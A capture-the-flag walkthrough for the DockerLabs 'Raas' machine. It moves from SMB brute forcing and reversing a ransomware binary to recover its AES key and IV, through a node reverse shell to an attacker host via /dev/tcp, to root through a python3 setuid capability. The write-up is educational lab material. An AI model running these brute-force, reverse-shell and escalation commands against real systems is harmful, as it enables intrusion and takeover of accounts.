![Screenshot](/hard/Raas/Images/machine.png)

Difficulty: **Hard**

Made by: **Darksblack**

---
# Steps to pwn 🥽:
* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---
## 🛠️ Techniques: Enumerate for smbfolders with smbmap, Bruteforce to service smb with crackmapexec, Download files in smb services with smbclient, reverse engineering a binary with Ghidra, Create a python script to decrypt data, Access through ssh with credentials, User pivoting with sudoer of the binary Node, Find hidden credentials, and finally escalate privileges with a capability of python3

---
First of all we make sure that the machine is up, we can prove it with the command **ping**

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ ping 172.17.0.2   
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.154 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.137 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.096 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.096/0.129/0.154/0.024 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

To start our reconnaissance phase, we use **nmap** to know what ports are open in the target.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 18:30 -0500
Initiating ARP Ping Scan at 18:30
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:30, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:30
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:30, 2.72s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-06-06 18:30:32 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: C6:D4:DB:7C:43:09 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 139 (netbios / smb)
- port 445 (microsoft-ds / smb)

To know more about these ports like what services and versions are running on, we can use nmap once again to do this.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ nmap -p22,139,445 -n -Pn -sCV 172.17.0.2 -oN target.txt --stats-every=1m
```

**-p22,139,445** <- With this argument nmap will only scan these 3 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oN target.txt** <- With this argument we save all the output that nmap give us and save it as a normal nmap file.

**--stats-every=1m** <- With this argument we want to see the status of the scan for every minute.

And now if we see our scan with **bat** (batcat) we can see this:

```ruby
# Nmap 7.99 scan initiated Sat Jun  6 18:33:15 2026 as: /usr/lib/nmap/nmap --privileged -p22,139,445 -n -Pn -sCV -oN target.txt --stats-every=1m 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.000070s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 07:ba:24:3e:67:86:71:2c:1c:f9:c2:65:0d:b0:f2:42 (ECDSA)
|_  256 e2:7a:9a:9d:58:2a:07:05:5f:e9:01:b6:7e:0d:e7:da (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: C6:D4:DB:7C:43:09 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-06T23:33:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  6 18:33:32 2026 -- 1 IP address (1 host up) scanned in 17.45 seconds
```

---
# Enumeration

We can see that the ports 139 and 445 are **smb**, so we can use **enum4linux** to enumerate Samba servers like this.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ enum4linux 172.17.0.2 -a
```

**-a** <- This argument we want to enumerate everything, like users, shared folders, password policy, etc...

And we can see this:

```r
 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: patricio Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: calamardo        Name:   Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 

user:[patricio] rid:[0x3e8]
user:[calamardo] rid:[0x3ea]
user:[bob] rid:[0x3e9]
```

We can see 3 users:
- patricio
- calamardo
- bob

We can save these users in a txt file.

And we can see a shared folders:

```r
 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                                                                                                                                              
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                                                         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ransomware      Disk      
        IPC$            IPC       IPC Service (dockerlabs server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                                                                                                    
                                                                                                                                                                                                                                              
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                             
//172.17.0.2/ransomware Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                                
                                                                                                                                                                                                                                              
NT_STATUS_CONNECTION_REFUSED listing \*                                                                                                                                                                                                       
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

We notice that the folder **ransomware** we don't have permissions to read or writing.

---
# Exploitation

So we can use the users that we obtain before to do a bruteforce attack with **crackmapexec**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

**-u** <- With this argument we user the list of usernames that we saved before.

**-p** <- With this argument we pass the list of passwords to make a brute force attack, in this case we are using the dictionary **rockyou.txt** with over 14 million possible passwords to try.

And we can see this:

```ruby
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:1234567890 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:superman STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:hannah STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:amanda STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:loveyou STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [-] DOCKERLABS\patricio:pretty STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    DOCKERLABS       [+] DOCKERLABS\patricio:basketball
```

We notice that the password of **patricio** is **basketball**.

So we can login with **smbclient** with these credentials.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/enumeration]
└─$ smbclient \\\\172.17.0.2\\ransomware -U patricio
Password for [WORKGROUP\patricio]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan  5 16:14:21 2025
  ..                                  D        0  Sun Jan  5 16:14:21 2025
  private.txt                         N       48  Sun Jan  5 11:27:26 2025
  nota.txt                            N      379  Sun Jan  5 11:28:19 2025
  pokemongo                           N    17592  Sat Jan  4 12:25:18 2025

                475087880 blocks of size 1024. 377757576 blocks available
```

And we can see these files in the directory, so to download it we can use the command **get**.

```r
smb: \> get private.txt 
getting file \private.txt of size 48 as private.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> get nota.txt 
getting file \nota.txt of size 379 as nota.txt (92.5 KiloBytes/sec) (average 27.8 KiloBytes/sec)
smb: \> get pokemongo 
getting file \pokemongo of size 17592 as pokemongo (636.3 KiloBytes/sec) (average 419.0 KiloBytes/sec)
```

Now let's try to read the nota.txt file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cat nota.txt  
estuve analizando el ransomware que el estupido de bob ejecuto para ver si lograba desencriptar sus archivos 
pero hasta ahora no he conseguido nada, me esta costando mas de lo que pensaba, asi que comparto el binario 
para que calamardo vea si puede hacer algo por bob.

Calamardo, si logras conseguir algo, lo mas urgente es que desencriptes el archivo "private.txt" por favor
```

We can see that this text are telling that the private.txt file is an encrypted file, let's take a look.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cat private.txt 
W�R����V<$¶~�hH"~�g��v��,T�^���(����uh� 
```

And yes, his content is encrypted, and we got another file **pokemongo**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ file pokemongo 
pokemongo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6f1b5eb6016808f7847871479cf0e8898f32f67a, for GNU/Linux 3.2.0, not stripped
```

We can see that this is a executable file, a binary in an architecture of 64 bits and not stripped.

So possibly is this the ransomware binary that encrypt the files, we can use **checksec** to see what protections exists in this binary.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ checksec --file=pokemongo  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   68 Symbols        No    0               4               pokemongo
```

Almost all the protections are enabled except for **Stack canary** this protection is to prevent buffer overflows, but are disabled.

Before to execute it let's do a little bit of reverse engineering with **Ghidra**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ ghidra
```

So i'm going to edit the necessary variables and to fully understand what does the binary.

Okay after analysing the binary this is the behaviour of the binary:

- Checks if the **hostname** of the machine is equal to **dockerlabs** if **NOT** the binary exits.
- Checks if the next files exists: **/opt/ak.pk1** **AND** **/bin/12bn** and if these 2 files exists in the system the binary are going to proceed to the encryption process.

This is the Main function:

```c

undefined8 main(void)

{
  int checker;
  undefined8 local_438;
  undefined8 local_430;
  undefined1 all_str [32];
  char host [1024];
  
  gethostname(host,1024);
  checker = strcmp(host,"dockerlabs");
  if (checker == 0) {
                    /* In case these files exists. */
    checker = file_exists("/opt/ak.pk1");
    if ((checker != 0) && (checker = file_exists("/bin/12bn"), checker != 0)) {
      recon(all_str);
      rand_str1 = 0x3837363534333231;
      rand_str2 = 0x3635343332313039;
      encrypt_files_in_directory("/home/",all_str,&rand_str1);
      return 0;
    }
    puts("Ten cuidado con lo que ejecutas!");
  }
  else {
    puts("Ten cuidado con lo que ejecutas!");
  }
  return 1;
}
```

We can see if the files exists are going to call the function **recon**, this is the code of the function:

```c

void recon(char *all_str)

{
  size_t str_length;
  
  builtin_strncpy(all_str,"y0qp",5);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"fjxbd",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"79047",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"929ew",6);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"0omqad3f",9);
  str_length = strlen(all_str);
  builtin_strncpy(all_str + str_length,"4gscl",6);
                    /* all_str = y0qpfjxbd79047929ew0omqad3f4gscl */
  return;
}
```

This function is doing basically construct a string, as we can see in the commentary.

Inside of the **encrypt_files_in_directory** function are basically checking is reading the content of the home directory, and by each file of that directory checks if is a regular file, if it is, the content are going to be encrypted by the function **encrypt**, in case the "file" is a directory are going to execute the same function of **encrypt_files_in_directory**.

To make easier to understand i'm going to make a graph behaviour of the binary.

![Screenshot](/hard/Raas/Images/image1.png)

The cyan parts are the important ones for us, specially the **encrypt** part, here is the full function in code C:

```c

void encrypt(char *clear_data,int position_pointer)

{
  int checker;
  EVP_CIPHER *cipher;
  uchar *iv;
  uchar *key;
  uchar *buffer_space;
  int fp_location;
  int same_fp_loc;
  EVP_CIPHER_CTX *ctx_mode;
  
  ctx_mode = EVP_CIPHER_CTX_new();
  if (ctx_mode == (EVP_CIPHER_CTX *)0x0) {
    handleErrors();
  }
  cipher = EVP_aes_256_cbc();
                    /* Cipher mode = AES-256-CBC */
  checker = EVP_EncryptInit_ex(ctx_mode,cipher,(ENGINE *)0x0,key,iv);
  if (checker != 1) {
    handleErrors();
  }
  checker = EVP_EncryptUpdate(ctx_mode,buffer_space,&fp_location,(uchar *)clear_data,
                              position_pointer);
  if (checker != 1) {
    handleErrors();
  }
  same_fp_loc = fp_location;
  checker = EVP_EncryptFinal_ex(ctx_mode,buffer_space + fp_location,&fp_location);
  if (checker != 1) {
    handleErrors();
  }
  same_fp_loc = same_fp_loc + fp_location;
  EVP_CIPHER_CTX_free(ctx_mode);
  return;
}
```

We can see that the cipher mode is **AES 256 CBC** this is important to know very well, and also we can see an argument **key** and **iv** in **EVP_EncryptInit_ex**, this means if we obtain these values we can decrypt the **private.txt** file, if you remember before we got a string, so probably is the key of the cipher because it needs at least 32 bytes long, and this string apply in this requisite.

Okay what about **iv**?

it's probably that these variables in main are iv:
- rand_str1 = 0x3837363534333231;
- rand_str2 = 0x3635343332313039;

These hexadecimal values we can try to decode it, we can use python to do it:

```r
>>> print(bytes.fromhex('3837363534333231').decode()[::-1])
12345678
>>> print(bytes.fromhex('3635343332313039').decode()[::-1])
90123456
```

So the this hexadecimal numbers are in little endian, so we need to reverse the string with `[::-1]`
If we join these strings the length in total is 16 bytes, and in iv value this applies also.

But to make sure this values are correct we can try to make an **breakpoint** with **GDB** to stop exactly where is called **EVP_EncryptInit_ex** to capture the key and iv.

So we need to know the calling conventions registers in linux with this function.

| function           | RDI      | RSI    | RDX    | RCX | r8  |
| ------------------ | -------- | ------ | ------ | --- | --- |
| EVP_EncryptInit_ex | ctx_mode | cipher | engine | key | iv  |


So we can capture the key in the register **RCX**  and the **iv** in **r8** when the binary are calling the function **EVP_EncryptInit_ex**.

To do it we need to do this:
- We need to change the assembly instruction when checking our host to skip this restriction of "dockerlabs".
- We need to create those 2 files to **/opt/ak.pk1** and **/bin/12bn** to bypass and run the encryption process.

Okay so let's start modifying the assembly instruction to make the jump even if the host is doesn't dockerlabs.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ chmod +x pokemongo
```

We give permission of execution and let's do a backup if we mess the binary.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ cp pokemongo pokemongo.bkp
```

Now let's use **radare2** to see the assembly instructions.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ r2 pokemongo
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x000011f0]>
```

Now let's type **aaa** to analyze all the binary and let's do enter.

```r
[0x000011f0]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x000011f0]>
```

Now let's analyze tha main function with **pdf@main** that stands for **print disassemble function main**.

```r
[0x000011f0]> pdf@main
```

And we can see this:

![Screenshot](/hard/Raas/Images/image2.png)

We can see that the address **0x000017d2** it's located the assembly instruction that we want to modify.

To activate the write mode we write the following command: **oo+** that stands for open once again the binary in read and write mode.

```r
[0x000011f0]> oo+
```

Now let's jump to the address **0x000017d2** with the command **s** that stands for move pointer.

```r
[0x000011f0]> s 0x000017d2
[0x000017d2]>
```

Okay let's modify the assembly instruction with **wa** that stands for write assembly and change je (jump equal) to jne (jump not equal)

```r
[0x000017d2]> wa jne 0x17ed
INFO: Written 2 byte(s) (jne 0x17ed) = wx 7519 @ 0x000017d2
```

So we are doing something like this:

```c
if (host != "dockerlabs"){
	# continues...
}
```

We are changing the equal `==` to  not equal `!=` so if basically our host when is different to dockerlabs we are going to continue.

Now we need to create those files to bypass this "security" mode of the binary, we can do it with the command **touch**:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ sudo touch /opt/ak.pk1
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ sudo touch /bin/12bn
```

Now let's execute the binary with **gdb**

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ gdb -q pokemongo
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.01ms using Python engine 3.13
Reading symbols from pokemongo...
(No debugging symbols found in pokemongo)
gef➤
```

So we need to disassemble the encrypt function to see where it's the address to place the breakpoint.

```r
gef➤  disas encrypt
Dump of assembler code for function encrypt:
-----------
   
   0x0000000000001401 <+68>:    mov    r8,rcx
   0x0000000000001404 <+71>:    mov    rcx,rdx
   0x0000000000001407 <+74>:    mov    edx,0x0
   0x000000000000140c <+79>:    mov    rdi,rax
   0x000000000000140f <+82>:    call   0x1090 <EVP_EncryptInit_ex@plt>
   
-----------
```

And we can see that where is located the call assembly instruction, so let's put the breakpoint on **encrypt+82**

```r
gef➤  b*encrypt+82
Breakpoint 1 at 0x140f
```

Now let's run the program with **r**.

And we can see this:

![Screenshot](/hard/Raas/Images/image3.png)

And effectively, we can see that the registers **RCX** is the **key** and **r8** is the **iv**.

If you want to check it out we can use **x/s** this is **examine string**:

```r
gef➤  x/s $rcx
0x7fffffffd5b0: "y0qpfjxbd79047929ew0omqad3f4gscl"
gef➤  x/s $r8
0x7fffffffd5a0: "1234567890123456y0qpfjxbd79047929ew0omqad3f4gscl"
```

So we have all the necessary pieces to make a python script to decrypt the **private.txt** file.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'y0qpfjxbd79047929ew0omqad3f4gscl'
iv = b'1234567890123456'
private_file = './private.txt'

def decipher():
    file = open(private_file, 'rb')
    encrypted = file.read()

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size).decode().strip()
    print('[!] Content of the file private.txt:')
    print('-'*40)
    print(decrypted)
    print('-'*40)

    with open('./decrypted_private.txt', 'w') as f: f.write(decrypted)
    print('[i] Decrypted content saved in [decrypted_private.txt]')

if __name__ == '__main__':
    decipher()
``` 

You maybe need to install one python library that is **pycryptodome** you can install it with the following command:
- **pip install pycryptodome**

So if we execute this python script we can see this:

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ python decrypter.py 
[!] Content of the file private.txt:
----------------------------------------
las credenciales ssh son: bob:[REDACTED]
----------------------------------------
[i] Decryted content saved in [decrypted_private.txt]
```

We decrypted the file and also we can see some credentials of the user bob and his password.

Now let's login with ssh.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ ssh bob@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:2dbIR05zABWAIdh6CReawBuuFTKEUMfDmcJagHweik0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
bob@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.19.11+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: /home/bob/.profile: line 1: syntax error near unexpected token newline
bob@dockerlabs:~$
```

Now we are in!

---
# Privilege Escalation

If we execute **sudo -l** we can see this:

```r
bob@dockerlabs:~$ sudo -l
Matching Defaults entries for bob on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on dockerlabs:
    (calamardo) NOPASSWD: /bin/node
```

We can see that the user **calamardo** can execute the command node, so we can do user pivoting with this privilege.

But first let's make our machine be in listen mode with **netcat** to receive the reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Now let's execute the node command to do a reverse shell.

```r
bob@dockerlabs:~$ sudo -u calamardo node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/172.17.0.1/1234 0>&1\"')"
```

**-e** <- With this argument we are telling to node to execute the following command.

**-c** <- We are telling to bash to execute the following command.

**-i** <- We are telling to bash to make an interactive shell.

`>&` <- We are redirecting **stderr** to **stdout**.

**0>&1** <- We are redirecting **stdin** to **stdout**.

And we receive this on our **netcat** terminal.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35398
calamardo@dockerlabs:/home/bob$ whoami
whoami
calamardo
```

So we need to modify this shell, is way ugly so let's make some treatment to it.

First of all we do this:

```r
calamardo@dockerlabs:/home/bob$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** as the output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of bash.

When we execute this, we suspend our reverse shell for a moment with CTRL + Z.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/raas/files]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. We can do this in the next way to be able to clear our screen if it get nasty:

```r
calamardo@dockerlabs:/home/bob$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
calamardo@dockerlabs:/home/bob$ stty rows {num} columns {num}
```

and finally it looks way better!

Now let's try to move to the user **patricio**.

after a long time looking for possible ways to try to move this user we can find this:

```c
calamardo@dockerlabs:~$ grep -r patricio
.bashrc:# should be on the output of commands, not on the prompt patricio:[REDACTED]
```

**-r** <- With this argument we are going to ask grep to search recursively.

And we can find a kind of credentials of the user **patricio**, we can try to change with this password with **su**.

```r
calamardo@dockerlabs:~$ su patricio
Password: 
patricio@dockerlabs:/home/calamardo$
```

Great, now let's find if we can escalate privileges.

Then I find that we have a **capability**.

```r
patricio@dockerlabs:~$ getcap -r / 2>/dev/null
/home/patricio/.ssh/python3 cap_setuid=ep
```

We can see a python binary inside of the home directory of patricio.

And we can change our uid (user identifier) to 0 (root) with this binary of python because we have the permission of Effective and Permitted.

So we execute the following command to convert us to the user root.

```c
patricio@dockerlabs:~$ .ssh/python3 -c 'import os; os.setuid(0); os.system("bash")'
root@dockerlabs:~# whoami
root
root@dockerlabs:~# id
uid=0(root) gid=1001(patricio) groups=1001(patricio),100(users)

```

Okay so we are asking to python to execute the following command **-c** and after change our UID to 0 we spawn a bash shell with **os.system** to type commands.

We are **root** now ***...pwned..!***
